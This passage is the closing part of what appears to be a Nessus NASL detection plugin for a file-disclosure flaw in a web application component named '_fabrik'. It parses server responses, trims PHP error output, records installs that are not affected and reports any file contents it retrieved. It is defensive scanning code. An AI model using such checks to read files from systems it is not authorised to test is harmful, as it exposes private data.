          else if (ereg(pattern:"_fabrik$", string:com[i]))
          {
            contents = "";
            foreach line (split(body, keep:TRUE))
            {
              if (ereg(pattern:'^<b>Fatal error', string:line)) break;
              if (!ereg(pattern:'^<b(r /)?>', string:line)) contents += line;
            }
          }
          else
          {
            contents = body;
            if ("<br" >< contents) contents = contents - strstr(contents, "<br");
          }
        }
        else contents = body;
        break;
      }
    }
    if (info && !thorough_tests) break;
  }
  non_affect = make_list(non_affect, dir);
  if (info && !thorough_tests) break;
}
# Audits
if (!info)
{
  installs = max_index(non_affect);

  if (installs == 0)
    exit(0, "None of the "+app+ " installs (" + join(dirs, sep:" & ") + ") on port " + port+ " are affected.");

  else if (installs == 1)
    audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir, port:port));

  else exit(0, "None of the "+app+ " installs (" + join(non_affect, sep:" & ") + ") on port " + port + " are affected.");
}

# Report findings.
if (os && "Windows" >< os) found_file = str_replace(find:'/', replace:'\\', string:found_file);
if (empty_or_null(contents)) contents = body;

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  file        : found_file,
  request     : split(info),
  output      : contents,
  attach_type : 'text/plain'
);
exit(0);
